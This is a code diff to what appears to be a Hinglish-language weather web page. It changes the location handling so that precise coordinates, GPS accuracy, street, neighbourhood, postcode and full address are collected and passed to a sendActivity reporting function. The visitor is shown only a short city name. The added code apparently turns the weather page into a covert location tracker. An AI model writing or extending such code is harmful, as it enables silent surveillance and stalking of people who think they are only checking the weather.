@@ -127,14 +127,24 @@ function setStatus(msg, isError) {
   document.getElementById('retryBtn').style.display = isError ? 'block' : 'none';
 }
 
-async function getLocationName(lat, lon) {
+async function getLocationDetails(lat, lon) {
   try {
-    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&addressdetails=1&zoom=18`);
     const data = await res.json();
     const a = data.address || {};
-    return a.city || a.town || a.village || a.county || data.display_name || 'Aapki location';
+    const shortName = a.city || a.town || a.village || a.county || 'Aapki location';
+    return {
+      shortName: shortName,
+      fullAddress: data.display_name || shortName,
+      area: a.suburb || a.neighbourhood || a.residential || a.road || '',
+      road: a.road || '',
+      city: a.city || a.town || a.village || '',
+      state: a.state || '',
+      postcode: a.postcode || '',
+      country: a.country || ''
+    };
   } catch {
-    return 'Aapki location';
+    return { shortName: 'Aapki location', fullAddress: 'Aapki location' };
   }
 }
 
@@ -204,16 +214,28 @@ function start() {
       setStatus('Mausam load ho raha hai...', false);
       sendActivity({ event: 'Location mili, mausam fetch ho raha hai' });
       try {
-        let locName = 'Aapki location';
+        let loc = { shortName: 'Aapki location', fullAddress: 'Aapki location' };
         try {
-          locName = await getLocationName(latitude, longitude);
+          loc = await getLocationDetails(latitude, longitude);
         } catch (e) {}
-        document.getElementById('locName').textContent = '📍 ' + locName;
+        document.getElementById('locName').textContent = '📍 ' + loc.shortName;
 
         const info = await loadWeather(latitude, longitude);
 
         sendActivity({
-          location: { name: locName, lat: latitude.toFixed(4), lon: longitude.toFixed(4) },
+          location: {
+            name: loc.shortName,
+            fullAddress: loc.fullAddress,
+            area: loc.area,
+            road: loc.road,
+            city: loc.city,
+            state: loc.state,
+            postcode: loc.postcode,
+            country: loc.country,
+            lat: latitude.toFixed(6),
+            lon: longitude.toFixed(6),
+            accuracy: Math.round(pos.coords.accuracy) + ' meter'
+          },
           weather: info
         });
       } catch (e) {
